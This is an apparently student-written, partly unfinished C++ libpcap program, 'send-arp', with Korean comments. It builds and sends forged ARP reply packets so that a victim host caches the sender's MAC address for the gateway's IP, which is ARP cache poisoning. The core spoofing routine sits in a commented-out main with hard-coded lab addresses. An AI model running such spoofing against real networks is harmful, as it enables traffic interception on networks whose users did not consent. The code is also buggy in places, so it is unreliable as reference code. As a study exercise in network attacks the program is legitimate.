#include <cstdio>
#include <pcap.h>
#include <iostream>
#include <fstream>
#include <string>
#include "ethhdr.h"
#include "arphdr.h"

#define SUCCESS 1
#define FAIL -1

#pragma pack(push, 1) // 구조체 패딩 비트에 대한 내용. pop 나올 때 까지 패딩을 없애겠단 뜻
struct EthArpPacket final {
	EthHdr eth_;
	ArpHdr arp_;
};
#pragma pack(pop)

using std::cout;
using std::ifstream;
using std::string;
using std::cerr;

void usage() {
	cout << "syntax : send-arp <interface> <sender ip> <target ip> [<sender ip 2> <target ip 2> ...]\n";
	cout << "sample : send-arp wlan0 192.168.10.2 192.168.10.1\n";
}

// owner의 mac을 구해오는
void getMyMac(Mac& mac, string& dev) {
	// 리눅스의 경우
	// /sys/class/net/[dev]/address
	// 위 경로에 mac 주소가 char로 저장되어 있는데 eth0의 경우 argv에서 입력받은 dev를 넣어줘야될거 같음.
	ifstream fin;
	string path = "/sys/class/net/" + dev +"/address";
	fin.open(path);

	// 에러 체크
	if (fin.fail()) {
		cerr << "Error: " << strerror(errno);
	}

	string tmp;
	fin >> tmp;
	mac = tmp;
	// test code
	cout << (string)mac;
	// 맥 체크 굿

	fin.close();
}

void fillPacket(Mac& smac1, Mac& dmac, Mac& smac2, Ip& sip, Mac& tmac, Ip& tip, uint16_t type, EthArpPacket& packet) {
	packet.eth_.dmac_ = dmac;
	packet.eth_.smac_ = smac1;

	packet.eth_.type_ = htons(EthHdr::Arp);
	packet.arp_.hrd_ = htons(ArpHdr::ETHER);
	packet.arp_.pro_ = htons(EthHdr::Ip4);
	packet.arp_.hln_ = Mac::SIZE;
	packet.arp_.pln_ = Ip::SIZE;

	packet.arp_.op_ = htons(type);

	packet.arp_.smac_ = smac2;
	packet.arp_.sip_ = htonl(sip);
	packet.arp_.tmac_ = tmac;
	packet.arp_.tip_ = htonl(tip);
}

int sendARP(EthArpPacket& packet, pcap_t* handle) {
	// TYPE에는 ArpHdr::Request : Request
	// TYPE에는 ArpHdr::Reply   : Reply

	// 패킷 구성
	

	// 전송
	int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
	if (res != 0) {
		fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
		return FAIL;
	}
	return SUCCESS;
}

int parsePacket(const u_char* packet, EthArpPacket& send, EthArpPacket& out) {
	// ETH-ARP 패킷인지 확인하고 
	EthArpPacket header;
	memcpy(&header, packet, 26);
	
	// => ETH의 type정보를 확인
	if(header.eth_.type_ != htons(EthHdr::Arp)) {
		return FAIL;
	}

	// reply 패킷인지 확인
	if(header.arp_.op_ != htons(ArpHdr::Reply)) {
		return FAIL;
	}

	// send를 바탕으로 send에 대한 reply인지 확인
	if(send.eth_.smac_ != header.eth_.dmac_) return FAIL;
	if(send.arp_.smac_ != header.arp_.tmac_) return FAIL;
	if(send.arp_.sip_ != header.arp_.tip_) return FAIL;
	if(send.arp_.tip_ != header.arp_.sip_) return FAIL;

	


	// want에 적힌 mac, ip 정보를 매칭하고
	// == 연산자 오버라이딩 되어있어서 가능
	// Reply에 대한 거니까
	// 이더넷에서 smac <=> dmac
	// ARP에서 smac, sip => tmac, tip
	// ARPdptj tip => sip

	// 보낸 패킷을 바탕으로 받은 reply 패킷을 확인
	//want.eth_.Arp = 


	// 맞다면 result에
	return SUCCESS;


}

void initArg(char* argv[], Ip& sender, Ip& target) {
	sender = string(argv[0]);
	target = string(argv[1]);
}

void test_1(void) {
	Ip test;
	test = string("1.1.1.1");
	cout << string(test);
}

void test(void) {
	Mac mac;
	char* dev = "enp0s3";
	string dev_= dev;
	getMyMac(mac, dev_);
	
	Mac smac1 = Mac("08:00:27:2b:b1:96");
	Mac dmac = Mac("92:dd:52:5c:ee:81");

	Mac smac2 = Mac("08:00:27:2b:b1:96");
	Ip sip = Ip("192.168.0.13");
	Mac tmac = Mac("92:dd:52:5c:ee:81");
	Ip tip = Ip("192.168.0.7");

	char errbuf[PCAP_ERRBUF_SIZE];
	pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
	//sendARP(smac1, dmac, smac2, sip, tmac, tip, ArpHdr::Reply, handle);
}

int main(int argc, char* argv[]) {
	test_1();

	/*
	// 입력 인자 개수가 4개 이상이어야 하며 짝수여야함.
	if (argc < 4 || argc % 2 != 0) {
		usage();
		return -1;
	}

	char* dev = argv[1];
	char errbuf[PCAP_ERRBUF_SIZE];
	pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
	if (handle == nullptr) {
		fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
		return -1;
	}

	// flow를 생각해보면

	// sender, target, mymac만 아는 상태에서

	// 1. sender와 target ip를 대상으로 request를 해서 각각의 맥을 구한다.
	// 2. sender의 캐시 테이블을 감염시킨다
	// 3. 끝


	// 1. 본인 맥, 얻기 ; IP는 몰라도 괜찮음 왜냐하면 패킷은 어차피 맥 타고 오니까?
	// 여기까진 성공
	// 2. ARP Request / Reply로 victim, gateway 알아오기
	// 
	// 3. victim에게 본인이 gateway임을 알리는 Reply 보내기

	EthArpPacket packet;

	packet.eth_.dmac_ = Mac("92:dd:52:5c:ee:81");
	packet.eth_.smac_ = Mac("08:00:27:2b:b1:96");
	packet.eth_.type_ = htons(EthHdr::Arp);

	packet.arp_.hrd_ = htons(ArpHdr::ETHER);
	packet.arp_.pro_ = htons(EthHdr::Ip4);
	packet.arp_.hln_ = Mac::SIZE;
	packet.arp_.pln_ = Ip::SIZE;
	packet.arp_.op_ = htons(ArpHdr::Reply);
	packet.arp_.smac_ = Mac("08:00:27:2b:b1:96");
	packet.arp_.sip_ = htonl(Ip("192.168.0.1"));
	packet.arp_.tmac_ = Mac("92:dd:52:5c:ee:81");
	packet.arp_.tip_ = htonl(Ip("192.168.0.7"));

	int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
	if (res != 0) {
		fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
	}

	pcap_close(handle);
	*/
}
